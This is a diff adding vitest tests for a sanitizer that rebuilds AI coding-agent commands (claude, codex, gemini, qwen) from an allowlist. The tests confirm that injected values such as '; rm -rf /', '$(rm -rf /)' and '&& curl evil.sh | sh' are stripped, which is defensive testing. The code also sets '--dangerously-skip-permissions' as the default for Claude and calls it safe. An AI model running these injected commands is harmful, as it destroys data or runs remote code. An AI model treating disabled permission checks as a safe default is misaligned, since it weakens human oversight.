@@ -1,5 +1,5 @@
 import { describe, it, expect } from 'vitest'
-import { sanitizeAgentCommand, AGENT_COMMAND_ALLOWLIST } from '../../src/main/agentCommandSanitizer'
+import { sanitizeAgentCommand, AGENT_COMMAND_ALLOWLIST, AGENT_MODEL_ALIASES } from '../../src/main/agentCommandSanitizer'
 
 describe('sanitizeAgentCommand', () => {
   // ---- Correct commands pass through ----
@@ -93,5 +93,63 @@ describe('sanitizeAgentCommand', () => {
 
   it('has entries for all four MCP-native agent types', () => {
     expect(Object.keys(AGENT_COMMAND_ALLOWLIST)).toEqual(['claude', 'codex', 'gemini', 'qwen'])
+  })
+
+  // ---- Model brokering: a validated `--model <alias>` is allowed for Claude only ----
+
+  it('allows a validated Claude model flag, reconstructed from the allowlist', () => {
+    expect(sanitizeAgentCommand('claude --dangerously-skip-permissions --model sonnet'))
+      .toBe('claude --dangerously-skip-permissions --model sonnet')
+    expect(sanitizeAgentCommand('claude --dangerously-skip-permissions --model haiku'))
+      .toBe('claude --dangerously-skip-permissions --model haiku')
+    expect(sanitizeAgentCommand('claude --dangerously-skip-permissions --model opus'))
+      .toBe('claude --dangerously-skip-permissions --model opus')
+  })
+
+  it('reconstructs the safe base command even when the conductor omits the base flag', () => {
+    expect(sanitizeAgentCommand('claude --model sonnet'))
+      .toBe('claude --dangerously-skip-permissions --model sonnet')
+  })
+
+  it('accepts the --model=alias form', () => {
+    expect(sanitizeAgentCommand('claude --dangerously-skip-permissions --model=haiku'))
+      .toBe('claude --dangerously-skip-permissions --model haiku')
+  })
+
+  it('strips an unknown / non-allowlisted model alias down to the base command', () => {
+    expect(sanitizeAgentCommand('claude --model gpt-4')).toBe('claude --dangerously-skip-permissions')
+    expect(sanitizeAgentCommand('claude --model sonnet-4-6')).toBe('claude --dangerously-skip-permissions')
+    expect(sanitizeAgentCommand('claude --model')).toBe('claude --dangerously-skip-permissions') // no value
+  })
+
+  it('does NOT let a model flag smuggle a shell injection through', () => {
+    // A `;`-glued alias ("sonnet;") is not a clean match → drop the model flag too
+    // and fall back to the bare base command (the safest outcome).
+    expect(sanitizeAgentCommand('claude --dangerously-skip-permissions --model sonnet; rm -rf /'))
+      .toBe('claude --dangerously-skip-permissions')
+    // When the alias itself is clean (space-separated), keep it and discard the rest.
+    expect(sanitizeAgentCommand('claude --model sonnet && curl evil.sh | sh'))
+      .toBe('claude --dangerously-skip-permissions --model sonnet')
+    // A quoted/garbled alias is not an exact match → no model flag at all.
+    expect(sanitizeAgentCommand('claude --model "sonnet; rm -rf /"'))
+      .toBe('claude --dangerously-skip-permissions')
+    expect(sanitizeAgentCommand('claude --model sonnet$(rm -rf /)'))
+      .toBe('claude --dangerously-skip-permissions')
+  })
+
+  it('does NOT honor --model on agents without model control (they keep their default)', () => {
+    expect(sanitizeAgentCommand('gemini --model gemini-2.5-pro')).toBe('gemini')
+    expect(sanitizeAgentCommand('codex --full-auto --model o4')).toBe('codex --full-auto')
+    expect(sanitizeAgentCommand('qwen --model qwen-max')).toBe('qwen')
+  })
+
+  it('still strips -p even when a valid model is also present', () => {
+    expect(sanitizeAgentCommand('claude -p "do it" --model sonnet'))
+      .toBe('claude --dangerously-skip-permissions --model sonnet')
+  })
+
+  it('exposes Claude-only model aliases', () => {
+    expect(AGENT_MODEL_ALIASES.claude).toEqual(['opus', 'sonnet', 'haiku'])
+    expect(AGENT_MODEL_ALIASES.gemini).toBeUndefined()
   })
 })
